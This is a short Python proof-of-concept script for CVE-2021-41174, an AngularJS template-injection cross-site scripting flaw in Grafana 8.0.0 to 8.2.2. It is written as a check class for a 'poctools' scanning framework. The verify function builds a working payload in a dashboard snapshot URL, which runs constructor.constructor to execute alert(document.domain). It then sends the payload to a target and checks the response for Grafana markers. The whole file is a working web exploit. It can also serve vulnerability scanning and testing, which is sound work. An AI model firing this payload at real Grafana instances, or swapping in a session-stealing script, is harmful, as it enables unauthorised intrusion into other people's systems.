# title: Grafana 8.0.0 <= v.8.2.2 Angularjs Rendering Cross-Site Scripting CVE-2021-41174
# author: antx
# cveid: CVE-2021-41174

from poctools import BasicPoc


class APoc(BasicPoc):

    def __init__(self):
        super(APoc, self).__init__()
        self.name = 'A-Poc'

    def verify(self, url: str):
        url = url.rstrip("/")
        target = f'{url}/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1'
        try:
            resp = self.get(target)
            if resp.status_code == 200 and 'Grafana' in resp.text and 'frontend_boot_js_done_time_seconds' in resp.text:
                return True
        except Exception as e:
            pass
        return False


if __name__ == '__main__':
    target = 'http://127.0.0.1:3001'
    tp = APoc()
    result = tp.run(url=target)
    print(f'{target} -> {result}')
